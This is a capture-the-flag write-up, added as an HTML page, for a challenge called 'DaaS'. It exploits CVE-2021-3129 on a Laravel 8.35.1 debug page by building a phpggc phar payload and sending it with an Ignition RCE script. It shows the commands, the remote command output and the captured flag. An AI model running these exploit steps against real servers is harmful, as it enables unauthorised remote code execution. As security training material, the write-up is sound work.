@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>DaaS</title>
+    <link type="text/css" href="/css/markdown.css" rel="stylesheet">
+    <link type="text/css" href="/css/nav.css" rel="stylesheet">
+    <link rel="icon" href="/favicon.ico">
+</head>
+
+<body id="preview">
+    <div style="padding-bottom: 40px;">
+        <nav id="load-navbar"></nav>
+        <br />
+        <br />
+        <hr />    
+    </div>
+
+    <div id="tags">
+        <h5>Tags</h5>
+        <ul>
+            <li>Laravel v8.35.1</li>
+            <li>Debug</li>
+            <li>CVE-2021-3129</li>
+            <li>RCE</li>
+            <li>phpggc</li>
+        </ul>
+    </div>
+
+    <h1 class="code-line" data-line-start=0 data-line-end=1><a id="DaaS_0"></a>DaaS</h1>
+<h2 class="code-line" data-line-start=1 data-line-end=2><a id="Description_1"></a>Description</h2>
+<p class="has-line-data" data-line-start="2" data-line-end="3">We suspect this server holds valuable information that would further benefit our cause, but we’ve hit a dead end with this debug page running on a known framework called Laravel. Surely we couldn’t exploit this further… right?</p>
+<h2 class="code-line" data-line-start=4 data-line-end=5><a id="Methodology_4"></a>Methodology</h2>
+<p class="has-line-data" data-line-start="5" data-line-end="6">This challenge wasn’t provided with a source code but from the description we can take a hint that we are dealing with a <code>debug</code> page and <code>laravel</code> framework. The website also provides the <code>laravel</code> version.</p>
+<p class="has-line-data" data-line-start="7" data-line-end="8"><code>Laravel v8.35.1 (PHP v7.4.16)</code></p>
+<p class="has-line-data" data-line-start="9" data-line-end="10">This version is vulnerable to <code>CVE-2021-3129</code> (<code>RCE</code>). Exploit for this vuln is provided in <a href="https://github.com/ambionics/laravel-exploits">laravel-exploit</a>.</p>
+<h2 class="code-line" data-line-start=11 data-line-end=12><a id="Exploit_11"></a>Exploit</h2>
+<p class="has-line-data" data-line-start="12" data-line-end="13">We are going to list files in <code>/</code> directory</p>
+<pre><code class="has-line-data" data-line-start="15" data-line-end="18" class="language-sh">php <span class="hljs-operator">-d</span><span class="hljs-string">'phar.readonly=0'</span> ~/Documents/tools/phpggc/phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system <span class="hljs-string">"ls /"</span>
+laravel-exploits/laravel-ignition-rce.py http://<span class="hljs-number">138.68</span>.<span class="hljs-number">148.149</span>:<span class="hljs-number">31636</span>/ /tmp/exploit.phar
+</code></pre>
+<pre><code class="has-line-data" data-line-start="20" data-line-end="50">+ Log file: /www/storage/logs/laravel.log
++ Logs cleared
++ Successfully converted to PHAR !
++ Phar deserialized
+--------------------------
+bin
+boot
+dev
+entrypoint.sh
+etc
+flagmfBBE
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+www
+--------------------------
++ Logs cleared
+</code></pre>
+<p class="has-line-data" data-line-start="51" data-line-end="52">There is a flag</p>
+<pre><code class="has-line-data" data-line-start="54" data-line-end="57" class="language-sh">php <span class="hljs-operator">-d</span><span class="hljs-string">'phar.readonly=0'</span> ~/Documents/tools/phpggc/phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system <span class="hljs-string">"cat /flagmfBBE"</span>
+laravel-exploits/laravel-ignition-rce.py http://<span class="hljs-number">138.68</span>.<span class="hljs-number">148.149</span>:<span class="hljs-number">31636</span>/ /tmp/exploit.phar
+</code></pre>
+<pre><code class="has-line-data" data-line-start="59" data-line-end="68">+ Log file: /www/storage/logs/laravel.log
++ Logs cleared
++ Successfully converted to PHAR !
++ Phar deserialized
+--------------------------
+CHTB{wh3n_7h3_d3bu663r_7urn5_4641n57_7h3_d3bu6633}
+--------------------------
++ Logs cleared
+</code></pre>
+<h2 class="code-line" data-line-start=69 data-line-end=70><a id="Flag_69"></a>Flag</h2>
+<p class="has-line-data" data-line-start="70" data-line-end="71"><strong>CHTB{wh3n_7h3_d3bu663r_7urn5_4641n57_7h3_d3bu6633}</strong></p>
+
+    <script src="/js/navbar.js"></script>
+</body>
+
+</html>
